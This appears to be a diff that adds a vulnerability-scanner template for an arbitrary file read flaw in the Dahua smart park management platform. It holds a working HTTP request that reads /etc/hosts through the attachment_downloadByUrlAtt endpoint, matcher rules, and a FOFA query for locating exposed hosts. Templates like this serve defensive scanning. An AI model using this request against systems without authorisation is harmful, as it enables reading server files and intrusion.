@@ -1,0 +1,33 @@
+id: DaHua-attachment_downloadByUrlAtt-FileRead
+
+info:
+  name: 大华智慧园区综合管理平台attachment_downloadByUrlAtt接口任意文件读取漏洞
+  author: candada
+  severity: info
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="dahua-智慧园区综合管理平台"
+  tags: FileRead
+
+http:
+  - raw:
+      - |+
+        GET /portal/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/hosts HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - localhost
+      - type: status
+        status:
+          - 200
